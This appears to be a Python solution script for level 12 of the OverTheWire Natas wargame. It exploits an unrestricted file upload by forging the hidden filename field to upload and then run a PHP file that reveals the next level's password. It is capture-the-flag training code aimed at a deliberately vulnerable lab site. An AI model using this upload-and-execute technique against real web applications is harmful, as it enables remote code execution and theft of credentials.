import requests

import natas11
from helpers import between


def solution() -> str:
    url = "http://natas12.natas.labs.overthewire.org"
    username = "natas12"
    password = natas11.solution()

    # The source code shows that the application accepts any
    # file extension provided in the "filename" hidden field.

    file_name = "natas12.php"
    files = {
        "MAX_FILE_SIZE": (None, "1000"),
        "filename": (None, file_name),
        "uploadedfile": (file_name, open(file_name, "rb")),
        "submit": (None, "Upload+File"),
    }
    r = requests.post(url, auth=(username, password), files=files)
    start = 'The file <a href="'
    end = '">upload/'
    upload_path = between(r.text, start, end)
    upload_url = "{url}/{path}".format(url=url, path=upload_path)
    r = requests.get(upload_url, auth=(username, password))
    natas13_password = r.text.strip()
    return natas13_password
